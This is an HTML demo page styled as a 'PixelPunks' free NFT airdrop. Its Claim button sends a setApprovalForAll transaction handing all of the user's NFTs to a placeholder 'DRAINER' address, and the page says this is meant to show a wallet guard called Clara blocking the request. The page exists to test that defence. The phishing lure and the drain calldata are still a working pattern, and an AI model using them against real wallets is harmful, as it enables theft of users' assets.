<!doctype html><html lang="en"><head>
<meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
<title>PixelPunks — Free Airdrop</title>
<style>
  :root{--bg:#0b0714;--surface:#160f26;--text:#ece7ff;--muted:#9a8fc0;--acid:#c6ff5e;--line:#2a2140;--mint:#7fe8c3;--amber:#ffd08a}
  *{box-sizing:border-box;margin:0;padding:0}
  body{background:radial-gradient(1000px 500px at 70% -10%,rgba(198,255,94,.08),transparent),var(--bg);
    color:var(--text);font-family:system-ui,sans-serif;min-height:100vh;display:grid;place-items:center;padding:24px}
  .card{max-width:460px;width:100%;background:var(--surface);border:1px solid var(--line);border-radius:20px;padding:32px}
  .logo{font-size:32px;font-weight:800;letter-spacing:-.02em;margin-bottom:4px}.logo span{color:var(--acid)}
  .tag{color:var(--muted);font-size:14px;margin-bottom:20px}
  .wallet{font-family:ui-monospace,monospace;font-size:12px;color:var(--muted);border:1px solid var(--line);
    border-radius:10px;padding:10px 12px;margin-bottom:18px}
  .wallet b{color:var(--mint)}
  .art{font-size:56px;text-align:center;margin:8px 0 20px}
  button{width:100%;font-family:inherit;font-size:15px;font-weight:600;border:none;border-radius:12px;padding:13px;margin-top:10px;cursor:pointer}
  .primary{background:var(--acid);color:#0b0714}.ghost{background:transparent;color:var(--text);border:1px solid var(--line)}
  .log{margin-top:18px;font-family:ui-monospace,monospace;font-size:11.5px;line-height:1.7;color:var(--muted);
    border-top:1px solid var(--line);padding-top:14px;min-height:60px;white-space:pre-wrap;overflow-wrap:anywhere}
  .log .ok{color:var(--mint)}.log .block{color:var(--amber)}.log .sign{color:var(--acid)}
  .note{margin-top:16px;font-size:11px;color:var(--muted);opacity:.7}
</style></head>
<body>
  <div class="card">
    <div class="logo">Pixel<span>Punks</span></div>
    <div class="tag">Claim your free airdrop before it's gone 🔥</div>
    <div class="wallet" id="wallet">Wallet: connecting…</div>
    <div class="art">🎁</div>
    <button class="primary" id="claim">Claim free NFT airdrop</button>
    <button class="ghost" id="tip">Tip the artist · 0.001 ETH</button>
    <div class="log" id="log"></div>
    <div class="note">This page uses your installed wallet (MetaMask, Rabby…); Clara's guard sits in front of it.
      The Claim button requests <code>setApprovalForAll</code> — the drain pattern Clara blocks before your wallet ever sees it.</div>
  </div>
<script>
  const log = document.getElementById('log');
  const line = (html) => { log.innerHTML += html + '\n'; };

  // ---- Modern dApp: discover the installed wallet via EIP-6963 and sign through
  // the selected provider. When Clara's guard is active, the provider we receive
  // is already Clara-wrapped, so every signing call routes through the guard first.
  let selected = null;
  const found = new Map();
  window.addEventListener('eip6963:announceProvider', (e) => {
    const { info, provider } = e.detail;
    found.set(info.rdns, { info, provider });
    if (!selected) selected = { info, provider };
    render();
  });
  window.dispatchEvent(new Event('eip6963:requestProvider'));
  function render() {
    const guarded = selected && selected.provider && selected.provider.isClara;
    document.getElementById('wallet').innerHTML = selected
      ? `Wallet (via EIP-6963): <b>${selected.info.name}</b> · ${guarded ? 'protected by <b>Clara guard</b> 🛡' : '<span style="color:#ffd08a">NOT guarded — Clara inactive</span>'} <span style="opacity:.6">(${found.size} detected)</span>`
      : 'No wallet detected — install a wallet (MetaMask, Rabby…) and reload this page.';
  }
  setTimeout(render, 400);
  const provider = () => selected && selected.provider;

  const NFT = '0x3333333333333333333333333333333333333333';
  const DRAINER = '0x9999999999999999999999999999999999999999';
  const AFA = '0xa22cb465' + DRAINER.slice(2).toLowerCase().padStart(64,'0') + '1'.padStart(64,'0');

  async function acct() {
    const p = provider();
    if (!p) throw { message: 'No wallet connected. Install a wallet and reload.' };
    const a = await p.request({ method: 'eth_requestAccounts', params: [] });
    return a && a[0];
  }
  document.getElementById('claim').onclick = async () => {
    log.innerHTML = '';
    line('dApp → requesting setApprovalForAll (grants ALL your NFTs to ' + DRAINER.slice(0,8) + '…)');
    try {
      const from = await acct();
      await provider().request({ method: 'eth_sendTransaction', params: [{ from, to: NFT, data: AFA }] });
      line('<span class="ok">dApp: approval granted</span>');
    } catch (e) {
      line('<span class="block">⛔ Clara BLOCKED it — your wallet never saw the request. (' + (e && e.message || 'rejected') + ')</span>');
    }
  };
  document.getElementById('tip').onclick = async () => {
    log.innerHTML = '';
    line('dApp → requesting a 0.001 ETH tip…');
    try {
      const from = await acct();
      const h = await provider().request({ method: 'eth_sendTransaction', params: [{ from, to: from, value: '0x38d7ea4c68000' }] });
      line('<span class="ok">dApp: tip sent — ' + String(h).slice(0,14) + '…</span>');
    } catch (e) {
      line('<span class="block">Clara blocked / rejected: ' + (e && e.message || '') + '</span>');
    }
  };
</script>
</body></html>
